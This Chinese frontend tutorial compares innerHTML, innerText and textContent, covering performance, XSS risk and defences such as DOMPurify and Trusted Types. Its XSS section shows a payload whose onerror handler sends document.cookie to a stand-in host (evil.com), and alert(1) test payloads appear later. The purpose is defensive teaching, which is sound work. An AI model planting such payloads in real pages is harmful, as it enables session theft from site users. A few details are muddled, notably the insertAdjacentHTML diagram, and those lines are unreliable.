---
title: innerHTML、innerText 与 textContent
description: 三个文本属性的语义、性能差异、XSS 风险与安全替代方案。
---

# innerHTML、innerText 与 textContent

## 1. 概念定义

这三个属性都是 DOM 用来读取或更新元素内容的接口，但行为各异：

| 属性 | 定义 | 返回值 |
|------|------|--------|
| `innerHTML` | 读写元素内部的 HTML 标记（包括标签和文本） | 包含 HTML 标签的字符串 |
| `innerText` | 读写元素内部可见的文本（CSS 感知，会触发回流） | 仅可见文本，受 CSS 样式影响 |
| `textContent` | 读写元素及所有后代节点的纯文本（raw） | 所有文本，不含 HTML 标签 |

```html
<div id="demo">
  <span style="display:none">hidden</span>
  <span>visible</span>
</div>
```

```javascript
const el = document.getElementById('demo');
el.innerHTML    // "<span style="display:none">hidden</span><span>visible</span>"
el.innerText    // "visible"        (考虑CSS可见性，无缩进格式化)
el.textContent  // "hiddenvisible"  (包含隐藏内容，原样输出所有文本)
```

## 2. 性能对比

| | `innerHTML` | `innerText` | `textContent` |
|---|---|---|---|
| 做了什么 | 解析 HTML 标记，构建 DOM 树，触发完整的解析与渲染 | 读取计算样式，考虑 CSS 可见性，触发回流（reflow） | 直接读取 DOM 节点，递归拼接文本节点 |
| 相对速度 | 最慢 | 中等 | 最快（无额外计算） |

**性能实测规律（Chrome DevTools Performance 面板）：**

- `textContent` 写入：O(n)，纯文本拼接，无 DOM 解析
- `innerText` 读取：O(n) + 样式计算，每次触发 `getComputedStyle`
- `innerHTML` 写入：O(n) + HTML 解析器 + DOM 构建，大文档下慢 5-10x

**写入时的性能差异尤为显著：** 当频繁更新内容时，`textContent` 是最高效的选择。

## 3. 安全：innerHTML XSS 漏洞与防护

### 3.1 XSS 攻击原理

```javascript
// 攻击者注入恶意脚本
const userInput = '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">';
document.getElementById('app').innerHTML = userInput;
// 恶意脚本将随图片加载自动执行
```

### 3.2 防护方案

| 方案 | 说明 | 适用场景 |
|------|------|----------|
| DOMPurify | HTML 清洗库，过滤危险标签/属性 | 生产环境首选 |
| textContent 替代 | 完全不解析 HTML，攻击无效 | 仅需纯文本时 |
| 白名单正则过滤 | 自定义过滤逻辑 | 轻量级场景 |
| CSP Content-Security-Policy | 浏览器端安全策略 | 服务端配合 |

**DOMPurify 示例：**

```javascript
import DOMPurify from 'dompurify';

const dirty = userInput; // 不可信输入
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});
document.getElementById('app').innerHTML = clean;
```

```typescript
// React 中使用 DOMPurify
import DOMPurify from 'dompurify';

const SafeHTML = ({ html }: { html: string }) => {
  const sanitizer = typeof window !== 'undefined'
    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
    : html;
  return <div dangerouslySetInnerHTML={{ __html: sanitizer }} />;
};
```

**React 中 `dangerouslySetInnerHTML` 的风险：**

```tsx
// 危险：将用户输入直接传入
<p dangerouslySetInnerHTML={{ __html: userInput }} />

// 安全：先清洗再使用
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

## 4. 现代替代方案

### 4.1 insertAdjacentHTML / insertAdjacentText

```javascript
// 比 innerHTML 更细粒度地插入，效率更高
element.insertAdjacentHTML('beforeend', '<span>追加内容</span>');
element.insertAdjacentText('beforeend', '纯文本');
/*
beforebegin | <div>           | afterbegin
            | content         | beforeend
            | </div>          | afterend
afterend    |                 | beforebegin
*/
```

### 4.2 模板字面量（Template Literals）

```tsx
// React 函数组件
const UserCard = ({ name, avatar, bio }: UserProps) => (
  <div className="card">
    <img src={avatar} alt={name} />
    <h2>{name}</h2>
    <p>{bio}</p>
  </div>
);

// Vue 模板
const template = `<div class="card">
  <h2>${name}</h2>
  <p>${bio}</p>
</div>`;
```

**对比表格：**

| 场景 | 推荐方案 | 原因 |
|------|----------|------|
| 渲染用户提供的富文本 | DOMPurify + innerHTML | 需要保留格式但需防护 XSS |
| 渲染用户纯文本 | textContent | 最高效，无解析开销 |
| 需要获取样式感知文本 | innerText | 含 hidden 内容排除 |
| 动态替换整个元素内容 | innerHTML | 一次性替换 |
| 在元素末尾追加 HTML | insertAdjacentHTML | 局部插入，效率更高 |
| 在元素末尾追加纯文本 | insertAdjacentText | 局部插入，无 HTML 解析 |
| 搜索/过滤文本内容 | textContent | 最快，最准确 |
| 富文本编辑器 | contenteditable + 自定义 Model | 详见 [可编辑与拖拽](contenteditable-and-drag.md) |

## 5. 使用场景速查表

| 场景 | 选择 | 理由 |
|------|------|------|
| 向页面注入安全 HTML 片段 | DOMPurify.sanitize + innerHTML | 安全 + 保留格式 |
| 渲染纯文本内容 | textContent | 最高效，无 XSS 风险 |
| 获取用户看到的文本（含 CSS 效果） | innerText | 排除 `display:none` 等 |
| 动态替换整个元素内容 | innerHTML | 一次性替换 |
| 在元素末尾追加 HTML | insertAdjacentHTML | 局部插入，效率更高 |
| 在元素末尾追加纯文本 | insertAdjacentText | 局部插入，无 HTML 解析 |
| 搜索/过滤文本内容 | textContent | 最快，最准确 |
| 富文本编辑器 | contenteditable + 自定义 Model | 详见 [可编辑与拖拽](contenteditable-and-drag.md) |

## 6. 常见陷阱

```javascript
// 陷阱1: innerText 会受 display:none 影响
<div style="display:none">hidden text</div>
// innerText = ""（不可见文本被排除）
// textContent = "hidden text"（全部文本）

// 陷阱2: innerHTML 会执行 <script> 标签
el.innerHTML = '<script>alert(1)</script>'; // 不执行！
el.innerHTML = '<img src=x onerror="alert(1)">'; // 会执行！

// 陷阱3: innerText 在隐藏元素上读取返回空字符串
const hidden = document.createElement('div');
hidden.style.display = 'none';
hidden.textContent = 'foo';
hidden.innerText; // "" (Firefox/Chrome 均返回 "")
// textContent 始终返回 "foo"

// 陷阱4: 写入时 innerHTML 会丢失原有事件监听
const wrapper = document.getElementById('wrapper');
wrapper.innerHTML = '<button onclick="fn()">click</button>';
// 原 wrapper 上的事件监听全部丢失

// 陷阱5: IE 兼容性
// innerText: IE6+ 支持
// textContent: IE9+ 支持
// 需要兼容 IE8 时需做 polyfill
```

## 7. 面试 follow-up 问题

### 7.1 Q1: 如果一个 div 里有 `<span style="display:none">foo</span>bar`，三个属性的返回值分别是什么？为什么？

**答案：**

- `innerHTML` 返回完整 HTML 字符串：`<span style="display:none">foo</span>bar`
- `innerText` 返回可见文本（排除 hidden 内容）：`bar`
- `textContent` 返回所有文本节点：`foobar`

原因：`innerText` 是 CSS 感知的，会触发 `getComputedStyle`，不返回 `display:none` 元素的内容；`textContent` 是 raw 读取，遍历所有 Text 节点。

---

### 7.2 Q2: 为什么说 React 的 `dangerouslySetInnerHTML` 是"危险的"？如何安全使用？

**答案：**
`dangerouslySetInnerHTML` 等同于直接操作 `innerHTML`，如果传入未经过滤的用户输入，会导致 DOM 型 XSS 攻击。安全使用方式：

```tsx
import DOMPurify from 'dompurify';

const sanitize = (html: string) => DOMPurify.sanitize(html);

const SafeContent = ({ html }: { html: string }) => (
  <div dangerouslySetInnerHTML={{ __html: sanitize(html) }} />
);
```

此外，现代编辑器（如 Tiptap、Lexical）采用自定义 Model 而非 `contenteditable`，从架构上规避了此类风险。

---

### 7.3 Q3: 为什么频繁更新列表内容时推荐用 `textContent` 而不是 `innerHTML`？

**答案：**
`innerHTML` 每次写入都需要：

1. 字符串解析为 tokens
2. 构建临时 DOM 树
3. 计算样式（CSSOM）
4. 合并到主 DOM 树

而 `textContent` 只需将字符串直接写入 Text 节点，无解析过程。在 1000+ 条目的列表渲染中，`textContent` 比 `innerHTML` 快 5-10 倍，也更安全（无 XSS 风险）。

---

> 参考：
> - https://blog.csdn.net/sunyctf/article/details/124873855 （innerHTML/innerText/textContent 区别）
> - https://blog.csdn.net/weixin_34184158/article/details/85584313 （innerHTML XSS 利用）
> - https://www.cnblogs.com/cybozu/p/17692802.html （DOMPurify 使用方法）
> - https://blog.csdn.net/qq_41444226/article/details/138995095 （DOMPurify XSS 防御）
> - https://www.cnblogs.com/delishcomcn/p/17645080.html （HTML5 拖拽事件）

## 深入阅读与参考

!!! tip "怎么用这些资料"
    先读「官方文档与规范」建立准确的概念，再读「源码与示例」核对细节，最后用「教程、书籍与视频」换一种讲法加深理解。每条都写明了读哪一节、带着什么问题读。

### 官方文档与规范

| 资源 | 为什么读 | 怎么读 |
|---|---|---|
| [Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) | 权威定义 XSS 的成因与注入点，术语准确，便于引用与查证。 | 读攻击概述与防护章节，带着「innerHTML 为何危险」这一问题整理笔记。 |
| [XSS 防护 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | 按 HTML、属性、URL、JS 分场景给出转义规则，可直接落地。 | 排查项目中每处 innerHTML 赋值，判断输出位置并套用对应转义规则。 |
| [web.dev：Trusted Types](https://web.dev/articles/trusted-types) | 官方介绍 Trusted Types 机制，是 innerHTML 注入的浏览器级防线。 | 读 CSP 与 Trusted Types 章节，在测试页启用策略，修复所有违规赋值。 |

### 源码与示例

| 资源 | 为什么读 | 怎么读 |
|---|---|---|
| [Google XSS Game](https://xss-game.appspot.com/) | 分关卡动手实践，直观理解 DOM 型与反射型 XSS 的触发方式。 | 逐关通关后回看源码，说明每关注入点，并写出对应防护方案。 |

### 教程、书籍与视频

| 资源 | 为什么读 | 怎么读 |
|---|---|---|
| [PortSwigger：XSS](https://portswigger.net/web-security/cross-site-scripting) | 系统梳理三类 XSS 的原理与利用链，配有可实操的实验环境。 | 先读反射、存储、DOM 型章节，再各做一个实验，记录 payload 与成因。 |

## 应用与行业实践

### 应用场景地图

| 场景 | 用到本页哪个知识点 | 典型技术选型 | 注意事项 |
| --- | --- | --- | --- |
| 后台管理的万行表格，筛选后整体刷新 | innerHTML 整表重建的解析代价、textContent 写入不解析 | 行节点复用 + textContent 逐格更新 | 只改变化的单元格，行数增减时增删尾部节点 |
| 低端安卓的首屏列表 | innerText 读取触发重排、innerHTML 拼接阻塞主线程 | DocumentFragment + textContent | 首屏只渲染可见条数，其余交给滚动加载 |
| 多人协作白板的文字批注 | 高频写入同一节点、写入方式影响重排次数 | 合并到 requestAnimationFrame 内一次写入 | 写入用 textContent，避免中途出现半截标签 |
| 用户昵称与评论展示 | innerHTML 与 textContent 的转义差异、XSS 防护 | 昵称走 textContent，富文本走 DOMPurify 后 innerHTML | 昵称禁止参与字符串拼接后写入 |
| 从页面抓取文本做站内搜索或导出 | innerText 与 textContent 对隐藏元素、空白符的处理不同 | textContent 为主，按需回退 innerText | innerText 不返回 display:none 元素的文本 |
| 服务端渲染后前端接管 | innerHTML 赋值会清空已有子节点与事件绑定 | replaceChildren 或节点复用 | hydration 阶段不要用 innerHTML 覆盖 SSR 输出 |
| 富文本邮件或模板预览 | innerHTML 解析不可信 HTML 的风险 | 沙箱 iframe + 清洗后的 HTML | 预览内容不放进主文档解析 |
| 富文本编辑器的粘贴处理 | 读取粘贴板 HTML 再插入的流程 | 读取后先清洗，再插入目标节点 | 清洗放在插入之前，不放在保存时 |

### 三个场景拆解

#### 场景 1：后台管理的万行表格，筛选后整体刷新

**业务背景**：运营后台的订单表，行数从数千到上万，切换筛选条件时整表数据替换。

痛点是每次刷新都重建整张表的 DOM，滚动时出现掉帧和输入延迟。

**怎么用本页知识解决**：思路是把"重建表格"改成"复用行节点、只写变化的文本"。文本写入用 textContent，跳过 HTML 解析这一步。

```js
// 复用行节点：只更新文本，不重建整张表
function renderRows(tbody, rows) {
  const pool = tbody.children;                        // 已存在的行节点
  for (let i = 0; i < rows.length; i++) {
    const tr = pool[i] || tbody.appendChild(document.createElement('tr'));
    const cells = tr.children;
    for (let j = 0; j < rows[i].length; j++) {
      const td = cells[j] || tr.appendChild(document.createElement('td'));
      td.textContent = rows[i][j];                    // 纯文本写入，不触发解析
    }
  }
  while (tbody.children.length > rows.length) {        // 新数据行数变少时裁掉尾部
    tbody.lastElementChild.remove();
  }
}
```

- `tbody.children` 是活动集合，遍历时用下标取已有节点，不额外建数组。
- `td.textContent = value` 把值转成文本节点，用户数据里的尖括号不会变成标签。
- 行数增加时靠 `appendChild` 补节点，行数减少时用 `remove` 裁尾，中间行不动。
- 整段逻辑不读 `innerHTML`，也就没有 HTML 解析器的开销。
- 单元格里的值先转成字符串再赋值，避免对象被隐式转换。

**怎么度量收益**：在 Chrome DevTools 的 Performance 面板录制一次筛选动作，看 Scripting 时长和 Layout 次数。用 `PerformanceObserver` 监听 `longtask`，统计超过 50ms 的任务数量。同一数据集连测三次，取中位数比较改造前后。

**什么时候不该用**：

- 表格只有几十行、每次整块替换时，节点复用代码的维护成本高于收益，直接用模板生成更省事。
- 切换列结构需要整体重排时，逐格更新反而要写更多的映射逻辑。
- 单元格内挂的是带自身状态的子组件时，直接把值改到 textContent 会丢掉组件状态。

#### 场景 2：低端安卓机的首屏列表

**业务背景**：移动端首屏要渲染一批列表项，设备内存和 CPU 都有限，首屏拖慢会直接影响用户看到内容的时间。

用 Lighthouse 移动端预设配合 CPU 4 倍节流可以复现这个环境。

**怎么用本页知识解决**：思路是把首屏拼字符串改成建节点，并且一次插入。插入用 `replaceChildren`，文本用 textContent。

```js
// 首屏占位：先在内存里建好节点，再一次性挂到文档
const frag = document.createDocumentFragment();
for (const item of firstScreen) {
  const li = document.createElement('li');
  li.textContent = item.title;        // 写入文本节点，浏览器不解 HTML
  li.dataset.id = item.id;            // 结构化数据放 data 属性上
  frag.appendChild(li);
}
list.replaceChildren(frag);           // 一次替换，代替 list.innerHTML = html
```

- `createDocumentFragment()` 建立的节点在插入前不属于文档，不参与布局。
- 循环里只做 `createElement` 和 `textContent` 赋值，没有字符串拼接和解析。
- `replaceChildren(frag)` 一次替换全部子节点，插入 Fragment 时只增加一轮布局计算。
- 需要给后续逻辑用的字段放在 `dataset`，不靠文本内容反解。

**怎么度量收益**：用 Lighthouse 看 LCP 和 TBT，用 web-vitals 库在真机上报 LCP、INP。测量时在 DevTools 里开 Slow 4G 网络与 CPU 4 倍节流，跑五次取中位数。Performance 面板里再核对主线程上 `Parse HTML` 与 `Recalculate Style` 的占比。

**什么时候不该用**：

- 首屏节点由服务端渲染输出、并且已经绑定了事件时，用 `replaceChildren` 清空会切断绑定。
- 列表项本身含加粗、链接这类富文本标记时，textContent 会把标签当普通字符显示出来。

#### 场景 3：用户提交的昵称与富文本评论

**业务背景**：评论区任何人都能提交内容，既要有纯文本昵称，也要支持少量格式的富文本。

规模按每分钟提交量衡量，用压测脚本按同比例发请求即可复现。

**怎么用本页知识解决**：思路是按数据类型分两条路径。纯文本一律 textContent，需要保留格式的 HTML 先清洗再赋给 innerHTML。

```js
import DOMPurify from 'dompurify';

// 白名单：只允许这几个标签和属性通过
const POLICY = { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'], ALLOWED_ATTR: ['href'] };

function renderRich(el, userHtml) {
  const clean = DOMPurify.sanitize(userHtml, POLICY);  // 清洗结果才可信
  el.innerHTML = clean;                                // 赋值的来源是清洗产物
}

function renderPlain(el, text) {
  el.textContent = text;                               // 原样显示，尖括号不生效
}
```

- `renderPlain` 用于昵称、标题这类字段，赋值不会产生新的元素节点。
- `renderRich` 里的 innerHTML 只接收 `sanitize` 的返回值，不接收原始输入。
- 白名单写明标签，未列出的标签和属性被清掉。
- 两个函数分开，代码审查时能按函数名判断是否经过了清洗。

**怎么度量收益**：开启 CSP 的 `report-to` 收集违规上报，统计 Trusted Types 与脚本相关的违规条数。在测试环境提交固定用例，例如 `<img src=x onerror=alert(1)>`，确认不弹窗、且以文本形式展示。补一条统计：清洗后被移除的标签数量，用来观察输入来源的变化。

**什么时候不该用**：

- 需求要求原样保留用户排版（自定义字体、颜色）时，白名单会过滤掉这些属性，应改用受控的编辑器数据结构。
- 页面已经用框架的模板插值（React JSX、Vue 模板）输出内容时，不需要再手动调用 innerHTML。

### 行业先进实践

Trusted Types 配合 CSP 约束 innerHTML（出处：W3C Trusted Types 规范 / MDN Web Docs）

做法是给页面下发 `require-trusted-types-for 'script'`，让 `innerHTML` 只接受 TrustedHTML 对象，普通字符串赋值被拦截并上报。有效的原因是拦截点落在赋值语句本身，绕不开。借鉴方式：先用 Report-Only 模式收集一周违规，再在清洗函数处建立唯一命名策略。

DOMPurify 清洗后再赋 innerHTML（出处：DOMPurify 开源项目）

做法是用白名单把不可信 HTML 过滤成可信 HTML，再去掉脚本标签、事件属性、`javascript:` 协议链接。有效的原因是清洗与插入分成两步，插入的输入有确定来源。借鉴方式：项目里只保留一个清洗入口函数，其他位置不得直接调用 `sanitize`。

React 默认转义插值，插入 HTML 需要显式属性（出处：React 官方文档）

做法是 JSX 里的插值默认按文本处理，要插入 HTML 必须写成 `dangerouslySetInnerHTML`。有效的原因是危险操作在代码里可被字符串搜索到。借鉴方式：把该属性名加入代码审查清单和静态扫描规则。

lit-html 用 `<template>` 克隆与标记模板生成 DOM（出处：lit.dev 官方文档）

做法是渲染时不调用 innerHTML 解析字符串，改为克隆 template 内容并绑定值。有效的原因是模板只解析一次，后续更新只改节点属性与文本。借鉴方式：组件库的渲染路径优先选模板克隆方案。

Vue 的 v-html 指令附带安全警告（出处：Vue 官方文档）

做法是把插入 HTML 收敛成一个具名指令，文档明确提示只对可信内容使用、不对用户输入使用。有效的原因是能力保留但入口唯一，便于审计。借鉴方式：需要核对官方文档，确认当前主版本中该指令的转义行为与警告文案，再决定是否在项目内封装同名指令。

### 从学到用：落地路线

第 1 步：在一个非核心的列表页试点，把该页所有 `innerText` 读取改为 `textContent`，所有整块 `innerHTML` 重建改为节点复用或 `replaceChildren`。

验收标准：改动文件里不再出现用于纯文本字段的 `innerHTML` 赋值。

第 2 步：用 DevTools Performance 与 50ms 长任务计数验证试点页，记录改造前后的 Scripting 时长中位数。

验收标准：同一数据集三次录制，脚本时长的中位数不高于改造前，功能点全部通过回归。

第 3 步：把试点页的写法写成一页规范，覆盖"读取用什么、写入用什么、HTML 从哪来"，在周会上过一遍后推广到同类页面。

验收标准：新提交的代码在审查中按该规范评审，违规项在合并前被指出。

第 4 步：加入防回退手段，静态扫描规则命中 `innerHTML` 与 `innerText`，CSP 违规上报接入告警，清洗函数列为唯一入口。

验收标准：扫描规则在 CI 中运行；违规上报达到设定条数时有人跟进并记录处理结果。

### 动手作业

**目标**：做一个"评论墙"小页面，把本页三个属性的差异用可测量的方式展示出来。

**步骤**：

1. 搭一个页面，包含一个输入框、一个类型选择（纯文本 / 富文本）、一个提交按钮和一块渲染区域。
2. 纯文本路径用 `textContent` 输出，先提交 `<b>粗体</b>` 观察显示结果。
3. 富文本路径接入 DOMPurify，白名单只留 `b`、`i`、`a`、`p`、`br`，再赋给 `innerHTML`。
4. 再提交 `<img src=x onerror=alert(1)>`，记录两条路径各自的显示结果与是否弹窗。
5. 造 2000 条示例数据，分别用"拼接字符串后一次 `innerHTML`"和"DocumentFragment 加 `replaceChildren`"渲染，各跑三次。
6. 在 DevTools Performance 面板录制两次渲染，记录 `longtask` 数量与 Scripting 时长。
7. 把测量结果和结论写进 README，注明设备与节流设置。

**验收标准**：

- 纯文本路径提交 `<b>粗体</b>` 后，页面原样显示这段字符，不出现加粗效果。
- 提交 `<img src=x onerror=alert(1)>` 时不弹窗，且该输入不出现在 DOM 的元素属性里。
- 两次渲染的时间与长任务数量都记录在 README 中，并写明测量时的设备与节流参数。
- 代码中所有面向纯文本字段的写入都用 `textContent`，可以用文本搜索逐个核对。
- README 里能指出两种渲染方式各自的适用前提，并给出你实测到的差异。

